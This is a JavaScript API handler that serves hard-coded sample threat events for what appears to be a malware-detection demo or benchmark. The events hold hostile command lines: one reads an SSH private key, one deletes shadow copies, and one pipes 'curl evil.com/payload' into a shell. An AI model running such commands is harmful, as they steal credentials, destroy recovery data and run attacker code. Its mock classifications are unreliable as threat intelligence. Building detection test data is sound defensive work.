export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const benchmarkThreats = [
    {
      event: {
        pid: 33104,
        cmd: "screencapture -x -C /tmp/.hidden_stream.png && sqlite3 ~/.ssh/id_rsa",
        parent: "background_sync_service",
        user: "vatsalagarwal"
      },
      threat_classification: {
        identified: true,
        threat_name: "Pegasus (Mutated / Variant)",
        candidate_family: "Pegasus (Mutated / Variant)",
        operational_mode: "PASSIVE",
        risk_score: 84,
        confidence_percent: 73,
        is_mutated: true,
        mitre_technique: "T1113: Screen Capture"
      },
      advisory_text: "PASSIVE SURVEILLANCE DETECTED: Headless screenshot capture combined with SSH credential probing. Screen sharing blackout curtain engaged."
    },
    {
      event: {
        pid: 65219,
        cmd: "vssadmin delete shadows /all /quiet && update_tool.exe",
        parent: "svchost_fake.exe",
        user: "vatsalagarwal"
      },
      threat_classification: {
        identified: true,
        threat_name: "WannaCry Family",
        candidate_family: "WannaCry Family",
        operational_mode: "ACTIVE",
        risk_score: 92,
        confidence_percent: 58,
        is_mutated: false,
        mitre_technique: "T1490: Inhibit System Recovery"
      },
      advisory_text: "CRITICAL: Ransomware Canary Triggered. Shadow copy deletion intercepted. Process frozen."
    },
    {
      event: {
        pid: 89124,
        cmd: "bash -i -c 'curl evil.com/payload | sh'",
        parent: "ollama-agent-runtime",
        user: "sandbox_user"
      },
      threat_classification: {
        identified: true,
        threat_name: "DockerSocketEscape (Mutated / Variant)",
        candidate_family: "DockerSocketEscape (Mutated / Variant)",
        operational_mode: "ACTIVE",
        risk_score: 96,
        confidence_percent: 78,
        is_mutated: true,
        mitre_technique: "T1611: Escape to Host"
      },
      advisory_text: "CRITICAL: Autonomous Agent container sandbox breakout detected. Intercepted execution payload."
    }
  ];

  return res.status(200).json({
    status: "success",
    count: benchmarkThreats.length,
    threats: benchmarkThreats
  });
}
